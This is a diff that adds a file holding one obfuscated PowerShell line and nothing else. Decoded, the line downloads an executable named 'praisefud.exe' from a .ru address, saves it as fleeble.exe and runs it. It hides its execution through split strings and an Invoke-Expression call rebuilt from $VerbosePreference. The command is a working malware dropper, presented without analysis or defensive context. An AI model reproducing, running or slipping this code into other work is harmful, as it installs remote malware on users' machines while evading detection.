@@ -1,0 +1,1 @@
+﻿(('(New-'+'Obje'+'ct '+'Syst'+'em.N'+'et.'+'W'+'ebClient).'+'Downl'+'oadFil'+'e'+'({'+'0}'+'http:/'+'/toxics'+'olut'+'ion'+'s.r'+'u/'+'u'+'p'+'loa'+'d/'+'pra'+'is'+'efud.exe{0'+'}'+',{0'+'}fl'+'eeble.'+'exe{'+'0})'+';Start-Process {0}fle'+'eble.ex'+'e'+'{'+'0}') -f[chaR]39)|.( ([StRinG]$vErBOSepREFereNcE)[1,3]+'x'-joIn'')
